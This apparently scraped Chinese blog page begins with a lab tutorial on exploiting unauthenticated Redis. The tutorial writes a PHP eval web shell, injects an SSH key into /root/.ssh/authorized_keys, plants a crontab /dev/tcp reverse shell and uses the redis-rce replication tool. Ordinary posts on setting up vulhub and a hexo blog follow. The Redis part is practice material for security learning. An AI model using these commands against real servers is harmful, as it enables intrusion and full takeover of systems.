<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename test.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5.png"></p>
<p>接下来在攻击机上进行连接验证（注意一定要在kali linux上开启web服务，例如apache，negix等等，相关下载命令可以问cgatgpt，如果未下载，也可通过php -S 0.0.0.0:8080来实现）</p>
<p><img src="/redis/%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
<p>可见测试连接成功了。</p>
<p>写入shell文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename muma.php</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>尝试连接：</p>
<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5.png"></p>
<p><img src="/redis/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F.png"></p>
<h3 id="利用redis进行ssh密钥连接"><a href="#利用redis进行ssh密钥连接" class="headerlink" title="利用redis进行ssh密钥连接"></a>利用redis进行ssh密钥连接</h3><h4 id="ssh密钥连接"><a href="#ssh密钥连接" class="headerlink" title="ssh密钥连接:"></a>ssh密钥连接:</h4><p>大家都知道可以通过ssh远程登录另外一台电脑。ssh登录有两种一个是密码登录，一个是密钥登录我们主要看密钥登录是什么流程，公钥登录是为了解决每次登录服务器都要输入密码的问题，流行使用RSA加密方案，主要流程包含：</p>
<p>1、客户端生成RSA公钥和私钥</p>
<p>2、客户端将自己的公钥存放到服务器</p>
<p>3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端</p>
<p>4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</p>
<p>5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</p>
<h4 id="利用前提：-1"><a href="#利用前提：-1" class="headerlink" title="利用前提："></a>利用前提：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.当redis以root身份运行。</span><br><span class="line"></span><br><span class="line">2.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</span><br><span class="line"></span><br><span class="line">3.存在/root/.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录不过可能进不去root目录权限问题可能或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</span><br></pre></td></tr></table></figure>

<h4 id="开始复现：-1"><a href="#开始复现：-1" class="headerlink" title="开始复现："></a>开始复现：</h4><p>首先要有自己的ssh配套的公钥和私钥</p>
<p>windows下使用git来生成自己的ssh公钥与私钥，在桌面点击右键选择git bash here，执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%BD%BF%E7%94%A8git%E7%94%9F%E6%88%90ssh.png"></p>
<p>在用户名文件夹下的.ssh文件夹里</p>
<p><img src="/redis/%E5%85%AC%E9%92%A5%E7%94%9F%E6%88%90.png"></p>
<p>生成密钥之后我们可以将公钥id_rsa.pub里面内容复制粘贴到key.txt文件中，再上传到靶机上面，使用如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type key.txt | redis-cli.exe -h 192.168.10.129 -x set xxx#如果是linux 将type换成cat</span><br><span class="line">#将公钥作为value插入到数据库中，key随便啥值。</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dir /root/.ssh</span><br><span class="line">#修改redis数据库路径</span><br><span class="line">redis-cli.exe -h 192.168.10.129 config set dbfilename authorized_keys</span><br><span class="line">#生成缓冲文件authorized_keys</span><br><span class="line">redis-cli.exe -h 192.168.10.129 save</span><br><span class="line">#保存</span><br></pre></td></tr></table></figure>

<p><img src="/redis/redis%E7%9A%84ssh%E5%AF%86%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
<p>通过命令cd ~&#x2F;.ssh来进入.ssh文件夹下(一定要先成为超级用户，否则会进入失败)</p>
<p><img src="/redis/%E9%AA%8C%E8%AF%81.ssh%E5%85%AC%E9%92%A5%E6%98%AF%E5%90%A6%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F.png"></p>
<p>可以看到已经上传成功了，接下来在攻击机上的.ssh文件夹的终端下执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.129</span><br><span class="line">#连接</span><br></pre></td></tr></table></figure>

<p><img src="/redis/ssh%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5.png"></p>
<p>在这里输入你自己生成的私钥即可</p>
<p><strong>注意：</strong></p>
<p><strong>1.如果你是linux系统使用cat,是windows系统使用type.</strong></p>
<p><strong>2.如果你是windows那你利用ssh密钥连接运行ssh -i id_rsa <a href="mailto:&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#49;&#52;&#49;">&#114;&#111;&#x6f;&#x74;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x34;&#51;&#x2e;&#49;&#52;&#49;</a>需要在.ssh目录下，因为权限问题。</strong></p>
<p><strong>3.你利用redis上传公钥时候运行代码是在你解压的redis文件下运行。</strong></p>
<p><strong>4.文件名必须是authorized_keys,由配置文件决定的。</strong></p>
<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="什么是crontab"><a href="#什么是crontab" class="headerlink" title="什么是crontab"></a>什么是crontab</h4><p>crontab 是一个在类 Unix 系统中定时执行任务的命令，它允许用户在指定的时间点或时间间隔内运行命令或脚本。通常情况下，crontab 命令用于自动化重复性任务，如备份、数据同步、清理日志等。</p>
<p>用户可以通过 crontab 命令编辑和管理 crontab 文件，其中包含了需要定时执行的任务的详细信息，如执行命令、执行时间、执行频率等等。crontab 文件通常存储在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下，每个用户都有一个对应的 crontab 文件。</p>
<p>crontab 命令有很多选项和语法规则，它可以帮助用户创建和管理自己的 crontab 文件。例如，您可以使用 crontab -e命令来编辑您的 crontab 文件，使用 crontab -l命令来列出当前用户的 crontab 文件中的所有任务，使用 crontab -r 命令来删除当前用户的 crontab 文件。还可以使用 man crontab命令来查看 crontab 的详细说明和使用说明。</p>
<p>总之，crontab 是一个非常强大和常用的类 Unix 系统工具，它能够帮助用户自动化重复性任务，提高工作效率和系统稳定性。</p>
<h4 id="windows下下载ncat命令"><a href="#windows下下载ncat命令" class="headerlink" title="windows下下载ncat命令"></a>windows下下载ncat命令</h4><p><a target="_blank" rel="noopener" href="https://nmap.org/ncat/">这是下载ncat(也就是linux下nc)命令的网址</a></p>
<p>下载好之后将文件路径添加到PATH路径下面，以便可以在任何路径下使用，配置好后假设监听8888端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>

<p>出现如下页面就表示监听成功：</p>
<p><img src="/redis/windows%E4%B8%8B%E4%BD%BF%E7%94%A8nc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/在windows下使用ipconfig查到的域名/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line">#前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/redis/redis%E5%BC%B9shell.png"></p>
<p>![](redis&#x2F;kali 检测是否上传反弹文件成功.png)</p>
<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>可能我们上面的工作都做好了之后会发现依旧没有给我们弹shell</p>
<p><strong>第一个</strong>：首先你要看一下你的cron启动没有，可以先查看状态如果是running,那就不用管，如果不是就需要启动一下，一般而言cron都是自启动的。所以一般来说不会是这个出问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">service crond restart#重启</span><br><span class="line">service crond start#启动</span><br><span class="line">service crond stop#关闭</span><br><span class="line">service crond status#查看状态</span><br></pre></td></tr></table></figure>

<p>上面的命令不是一定的，有的环境下crond服务叫cron，可以用以下命令检测自己的cron服务叫什么名字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files | grep cron</span><br></pre></td></tr></table></figure>

<p><strong>第二个</strong>：我发现我的cron启动了但是依然无法反弹shell,去找了资料知道利用redis未授权访问写的任务计划文件都有乱码，这是乱码来自redis的缓存数据，这个问题无法解决的。centos会忽略乱码去执行格式正确的任务计划，而ubuntu和debian并不会忽略这些乱码，所以导致命令执行失败。我们手动删除乱码发现反弹仍然失败，查看资料发现我们还需要关注以下问题。</p>
<p><strong>第三个</strong>:root文件的权限必须为600也就是说是rw———–，执行如下命令进行排查和更改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">chmod 600 root </span><br></pre></td></tr></table></figure>

<p><strong>第四个</strong>:我们反弹shell的&#x2F;bin&#x2F;sh是bash，而我的靶机的bin&#x2F;sh是dash ,所以运行出错。我们需要通过以下命令查看和修改。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /bin/sh#查看运行环境</span><br><span class="line">ln -s -f bash /bin/sh#修改为bash</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%BF%AE%E6%94%B9%E5%8F%8D%E5%BC%B9%E7%9A%84%E8%B7%AF%E5%BE%84.png"></p>
<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><h4 id="了解什么是主从复制"><a href="#了解什么是主从复制" class="headerlink" title="了解什么是主从复制"></a>了解什么是主从复制</h4><p>edis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。这个大家自己找一些资料了解一下。</p>
<h4 id="主从复制反弹shell"><a href="#主从复制反弹shell" class="headerlink" title="主从复制反弹shell"></a>主从复制反弹shell</h4><p>如果要是的利用成功需要先下载攻击代码，步骤已经给到大家。不过linux来git clone可能会失败，所以这里的步骤是在windows上下载好之后直接将文件拖进linux，这里还有注意如果利用redis主从复制redis版本要是4.x或者5.x</p>
<p>靶机：kali 192.168.10.129</p>
<p>攻击机 windows 192.168.10.1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git</span><br><span class="line">    #下载RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce</span><br><span class="line">    #下载redis-rce</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%87.png"></p>
<p>就会在相应文件夹下生成两个文件夹<br><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%872.png"></p>
<p>将这两个文件夹拖入linux下，并进入RedisModules-ExecuteCommand目录，执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%87%86%E5%A4%873.png"></p>
<p>编译之后执行如下名令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv module.so /home/yyb167111/桌面/redis-rce  #就是redis-rce所在路径</span><br></pre></td></tr></table></figure>

<p>执行之后，就将redis-rce拖入windows下，也就是复制，然后进入到redis-rce文件夹目录下，执行cmd进入终端，然后执行如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.129 -L 192.168.10.1 -f module.so</span><br></pre></td></tr></table></figure>

<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%BC%B9shell.png"></p>
<p>可以看到一些参数，-r指的是靶机IP -L指的是攻击机IP，如果没有指定端口就会使用默认端口。</p>
<p>运行以下命令，会让你选择，可以输入i,r,e分别对应交互式shell,反弹shell和退出吧。</p>
<p>如果反弹shell就需要监听端口</p>
<p><img src="/redis/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%8F%8D%E5%BC%B9shell2.png"></p>
<p>注意：如果redis需要密码，可以加-a参数。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/02/vulhub%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/06/02/vulhub%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">vulhub搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-06-02 15:18:22 / 修改时间：15:24:51" itemprop="dateCreated datePublished" datetime="2023-06-02T15:18:22+08:00">2023-06-02</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.1k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>2 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="vulhub靶场搭建及使用"><a href="#vulhub靶场搭建及使用" class="headerlink" title="vulhub靶场搭建及使用"></a>vulhub靶场搭建及使用</h1><h2 id="1-进行系统更新"><a href="#1-进行系统更新" class="headerlink" title="1.进行系统更新"></a>1.进行系统更新</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su			             进入超级用户</span><br><span class="line">apt-get update                更新系统，防止后面安装时报错</span><br><span class="line">apt-get upgrade               更新软件包</span><br><span class="line">apt-get dist-upgrade          更新系统版本。如果你对新版本软件的需求不是那么迫切，可以不执行</span><br></pre></td></tr></table></figure>

<p>这几步几乎每次都会用，很常见，就不放图片了</p>
<h2 id="2-安装https协议及AC证书"><a href="#2-安装https协议及AC证书" class="headerlink" title="2.安装https协议及AC证书"></a>2.安装https协议及AC证书</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6.png"></p>
<h2 id="3-下载安装docker"><a href="#3-下载安装docker" class="headerlink" title="3.下载安装docker"></a>3.下载安装docker</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E5%AE%89%E8%A3%85docker.png"></p>
<h2 id="4-查看docker安装是否成功"><a href="#4-查看docker安装是否成功" class="headerlink" title="4.查看docker安装是否成功"></a>4.查看docker安装是否成功</h2><p>Docker自带一个hello-world环境，我们可以启动这个环境，测试docker功能是否正常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world </span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E9%AA%8C%E8%AF%81docker%E6%98%AF%E5%90%A6%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png"></p>
<h2 id="5-查看docker的各项基本信息"><a href="#5-查看docker的各项基本信息" class="headerlink" title="5.查看docker的各项基本信息"></a>5.查看docker的各项基本信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看Docker版本</span><br><span class="line">docker -v </span><br><span class="line">#启动docker环境</span><br><span class="line">systemctl start docker</span><br><span class="line">#显示所有的容器，包括未运行的容器</span><br><span class="line">docker ps -a</span><br><span class="line">#显示运行的容器</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/%E6%9F%A5%E7%9C%8Bdocker%E5%90%84%E9%A1%B9%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF.png"></p>
<h2 id="6-安装pip-3"><a href="#6-安装pip-3" class="headerlink" title="6.安装pip-3"></a>6.安装pip-3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip </span><br></pre></td></tr></table></figure>

<h2 id="7-安装Docker-Compose"><a href="#7-安装Docker-Compose" class="headerlink" title="7.安装Docker-Compose"></a>7.安装Docker-Compose</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure>

<p>6和7两步因为已经安装好了，图片没什么参考价值，输入安装命令后直接进行安装即可</p>
<h2 id="8-查看docker-compose版本"><a href="#8-查看docker-compose版本" class="headerlink" title="8.查看docker-compose版本"></a>8.查看docker-compose版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E6%9F%A5%E7%9C%8Bdocker-compose%E7%89%88%E6%9C%AC.png"></p>
<h2 id="9-安装vulhub靶场"><a href="#9-安装vulhub靶场" class="headerlink" title="9.安装vulhub靶场"></a>9.安装vulhub靶场</h2><p><strong>注意：是进入的~目录下面，进入之后进行如下命令执行（这里只是本人将其放在该目录下面，也可自行选择）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F.png"></p>
<h2 id="10-随便进入一个靶场目录"><a href="#10-随便进入一个靶场目录" class="headerlink" title="10.随便进入一个靶场目录"></a>10.随便进入一个靶场目录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root/vulhub/weblogic/CVE-2017-10271</span><br></pre></td></tr></table></figure>

<p><strong>注意：这里如果前面所下载的目录不是用户目录，就自行更改路径</strong></p>
<p><img src="/vulhub/vulhub%E8%BF%9B%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%9B%AE%E5%BD%95.png"></p>
<p>也可进入root&#x2F;vulhub&#x2F;weblogic之后执行如下命令进入靶场（以CVE-2017-10271为例）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd CVE-2017-10271</span><br></pre></td></tr></table></figure>

<h2 id="11-对靶场进行编译"><a href="#11-对靶场进行编译" class="headerlink" title="11.对靶场进行编译"></a>11.对靶场进行编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E7%BC%96%E8%AF%91%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83.png"></p>
<h2 id="12-运行此靶场"><a href="#12-运行此靶场" class="headerlink" title="12.运行此靶场"></a>12.运行此靶场</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E8%BF%90%E8%A1%8C%E9%9D%B6%E5%9C%BA.png"></p>
<h2 id="13-查看启动环境"><a href="#13-查看启动环境" class="headerlink" title="13.查看启动环境"></a>13.查看启动环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps -a</span><br></pre></td></tr></table></figure>

<p><img src="/vulhub/vulhub%E6%9F%A5%E7%9C%8B%E5%90%AF%E5%8A%A8%E7%8E%AF%E5%A2%83.png"></p>
<p>就表示是在虚拟机域名下的7001端口（虚拟机域名直接ifconfig即可）</p>
<h2 id="14-通过浏览器进行访问"><a href="#14-通过浏览器进行访问" class="headerlink" title="14.通过浏览器进行访问"></a>14.通过浏览器进行访问</h2><p><img src="/vulhub/vulhub%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE.png"></p>
<p><strong>注意：本题页面就是404，并不是无法访问的意思</strong></p>
<h2 id="15-关闭此靶场环境"><a href="#15-关闭此靶场环境" class="headerlink" title="15.关闭此靶场环境"></a>15.关闭此靶场环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>后续再想打开靶场，只需要重复10-14步即可</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/28/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="liberator">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="liberator">
      <meta itemprop="description" content="君子坐而论道，少年起而行之">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | liberator">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2023/05/28/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">博客搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-05-28 19:32:11" itemprop="dateCreated datePublished" datetime="2023-05-28T19:32:11+08:00">2023-05-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-07-28 11:50:56" itemprop="dateModified" datetime="2023-07-28T11:50:56+08:00">2023-07-28</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2.5k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>5 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="关于使用github-hexo进行博客搭建"><a href="#关于使用github-hexo进行博客搭建" class="headerlink" title="关于使用github+hexo进行博客搭建"></a>关于使用github+hexo进行博客搭建</h1><p>本次搭建需要git和js的环境，接下来按照步骤讲一下:</p>
<h2 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h2><p>官方下载地址：<a target="_blank" rel="noopener" href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p>
<p>注意需安装windows-64版本的，在安装好后，直接一路点击next即可，所有的都是默认的（也包括添加到PATH）</p>


<p>安装后验证: 在 cmd 中输入命令 node -v, 查看 Node 版本</p>
<h2 id="node-js安装"><a href="#node-js安装" class="headerlink" title="node.js安装"></a>node.js安装</h2><p>官方下载地址：<a target="_blank" rel="noopener" href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
<p>同样安装好后一路直接点击next即可</p>
<p>安装好后就可输入node-v，查看Node版本</p>
<h2 id="安装并初始化hexo"><a href="#安装并初始化hexo" class="headerlink" title="安装并初始化hexo"></a>安装并初始化hexo</h2><p>执行以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo     # 通过npm安装hexo</span><br></pre></td></tr></table></figure>

<p>其中，-g 指定全局安装，之后可以在任意位置使用 hexo 命令<br>接下来，进入到你要放博客的静态文件的位置，右键，选择 Git Bash Here，打开 Git Bash 之后，输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog      # 初始化创建，会在你所在位置创建 blog 文件夹</span><br><span class="line">cd blog             # 进入 blog 目录</span><br><span class="line">npm install         # 进一步安装hexo所需文件</span><br></pre></td></tr></table></figure>

<p>等待 hexo 安装完成。。。<br>安装完成后，会出现一下这些文件夹以及文件</p>


<p>其中 source 就是存放后面我们写博客的源文件的文件夹<br>接下来输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean          # 清除所有记录</span><br><span class="line">hexo generate       # 生成静态网页</span><br><span class="line">hexo s              # 本地访问</span><br></pre></td></tr></table></figure>



<p>访问其中域名，会出现下图：</p>


<h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>如果你不喜欢现在的主题样式可以选择换一个，首先是 <a target="_blank" rel="noopener" href="https://hexo.io/themes/">官方主题</a>，可以在里面下载自己喜欢的主题。<br>个人现在使用的是 <a target="_blank" rel="noopener" href="https://github.com/litten/hexo-theme-yilia">hexo-theme-yilia</a>。<br>这里就以这个主题为例：<br>先按 Ctrl + C,断开刚刚的服务，然后输入</p>
